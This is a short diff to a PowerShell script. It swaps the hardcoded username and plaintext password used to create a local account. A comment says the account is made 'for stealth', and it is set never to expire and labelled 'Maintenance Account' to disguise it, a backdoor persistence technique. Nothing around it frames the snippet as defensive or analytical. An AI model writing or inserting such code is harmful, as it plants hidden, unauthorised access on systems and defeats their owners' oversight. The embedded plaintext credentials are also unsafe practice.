@@ -1,6 +1,6 @@
 # username and password
-$user = "VmUser"
-$pass = "HSTS765$#Hsjh"
+$user = "VmUser2"
+$pass = "JAJA1212"
 
 # Creating the user using PowerShell for stealth
 New-LocalUser -Name $user -Password (ConvertTo-SecureString $pass -AsPlainText -Force) -AccountNeverExpires -Description "Maintenance Account"
